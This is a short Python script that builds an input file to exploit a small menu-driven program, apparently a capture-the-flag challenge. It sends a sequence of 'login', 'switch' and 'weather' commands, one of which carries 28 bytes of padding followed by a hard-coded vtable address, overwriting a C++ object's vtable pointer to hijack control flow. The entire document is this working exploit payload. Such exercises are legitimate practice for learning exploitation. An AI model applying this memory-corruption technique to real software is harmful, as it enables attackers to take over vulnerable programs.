payload = ""

def addline(bytes):
  return bytes + '\n'

vtable_address = "\xa0\xa8\x04\x08"

payload += addline("login")
payload += addline("aaaa")
payload += addline("login")
payload += addline("bbbb")
payload += addline("switch")
payload += addline("aaaa")
payload += addline("weather")
payload += addline("P"*28 + vtable_address + "cc")
payload += addline("switch")
payload += addline("bbbb")

fp = open("input","wb")
fp.write(payload)
fp.close()
